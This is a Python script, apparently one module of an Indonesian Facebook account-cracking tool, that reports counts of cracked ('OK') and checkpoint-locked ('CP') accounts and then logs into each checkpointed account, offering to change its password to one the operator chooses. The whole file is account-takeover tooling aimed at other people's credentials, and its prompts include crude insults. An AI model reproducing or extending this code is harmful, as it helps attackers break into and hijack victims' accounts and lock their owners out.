# coding by Romi Afrizal
from xyz import *
from xyz import detect as deteck

#--- SELESAI CRACK
ubah_pass = []
pwbaru = []

def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		tulis(Panel(f'{Te}{U} •{H} OK{M} : {H}{len(ok)}\n{U} •{K} CP{M} : {K}{len(cp)}',
		style='#FF0022'))
		if len(cp)==0:
			exit()
		exit()
		c = input('%s╰─%s gunakan detektor checkpoint? y/t%s > %s'%(p,o,m,k))
		if c =='':
			exit("%s╰─%s Isi yang benar kentod "%(p,m))
		elif c in['Y','y']:
			tulis(Panel(f"{Te} {U}•{O} Mode pesawatkan terlebih dahulu 5 detik ",style='#FF0022'))
			pw=input("%s╰─%s ubah sandi akun one tab? y/t %s> %s"%(p,o,m,k))
			if pw =='':
				print ("%s╰─%s isi yg benar kentod "%(p,m))
			elif pw in['y','Y']:
				ubah_pass.append("ubah_sandi")
				pw2=input("%s╰─%s masukan sandi %s> %s"%(p,o,m,k))
				if len(pw2) <= 5:
					print("%s╰─%s sandi minimal 6 karakter "%(p,m))
				else:
					pwbaru.append(pw2)
			nomor=0
			for fb in cp:
				akun = fb.replace("\n","")
				ngecek  = akun.split(" ◊ ")
				nomor+=1
				tulis(Panel(f"{Te}{H} {str(nomor)}.{O} login akun {M}> {K}{akun.replace(' *--> ','')}",style='#FF0022'))
				try:
					deteck.mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
				except requests.exceptions.ConnectionError:
					sys.stdout.write("\r%s╰─%s tidak ada koneksi "%(p,m)),
					sys.stdout.flush();jeda(1)
					pass
				except:
					pass
			tulis(Panel(f"{Te}{U} •{O} Selesai mengecek akun",style='#FF0022'))
			input('%s╰─%s [%s Enter%s ] '%(p,o,u,o))
			os.system("python bff-2.py")
		elif c in['t','T']:
			exit()
		else:
			exit ("%s╰─%s isi yg benar kentod "%(p,m))
	else:
		exit(f"{p}╰─{m} Ops... tidak mendapatkan hasil :(")
			